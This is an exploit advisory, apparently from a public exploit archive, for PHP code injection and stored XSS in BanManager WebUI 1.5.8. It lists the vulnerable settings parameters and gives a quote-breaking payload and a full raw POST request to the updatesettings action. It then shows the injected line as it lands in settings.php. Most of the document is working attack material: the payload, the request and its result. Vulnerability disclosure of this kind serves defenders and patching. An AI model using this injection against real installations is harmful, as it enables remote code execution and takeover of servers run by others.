  
# Exploit Title: BanManager WebUI - PHP Code Injection & Stored XSS
# Date: 2017-05-10
# Exploit Author: HaHwul
# Exploit Author Blog: www.hahwul.com
# Vendor Homepage: https://github.com/BanManagement/BanManager-WebUI
# Software Link: https://github.com/BanManagement/BanManager-WebUI.git
# Version: 1.5.8
# Tested on: Debian
 
### Vulnerability
Code executed via the updatesetting action will modify &#039;setting.php&#039;.
In the process, there is not verification of the input value, so it is possible to insert php code.
 
### Vulnerable param
PHP Code Injection & Stored XSS
 - footer
 - buttons_before
 - buttons_after
 
Only PHP Code Injection
 - banextra
 - muteextra
 
### Attack code
PAYLOAD: aaaaaa&#039;;$hacker=hwul//inject_php_code&#039;;
 
POST /vul_test/BanManager-WebUI/index.php?action=updatesettings&ajax=true&authid=3da541559918a808c2402bba5012f6c60b27661c HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://127.0.0.1/vul_test/BanManager-WebUI/index.php?action=admin
Content-Length: 168
Cookie: BanManagement=epnsf8sut1o05ps574h4861gu7
DNT: 1
Connection: keep-alive
 
type=mainsettings&iframe=on&utf8=on&footer=aaaaaa&#039;%3B%24hacker%3Dhwul%2F%2Finject_php_code&latestbans=on&latestmutes=on&latestwarnings=on&buttons_before=&buttons_after=
 
 
### Result(in settings.php)
$settings[&#039;password&#039;] = &#039;asdf&#039;; // ACP Password (Keep it strong)
$settings[&#039;footer&#039;] = &#039;aaaaaa&#039;;$hacker=hwul//inject_php_code&#039;;
$settings[&#039;admin_link&#039;] = true; // Show the admin link in the footer of all page
$settings[&#039;bm_info&#039;] = true; // Show ban management infomation aside &#039;Account Status&#039;

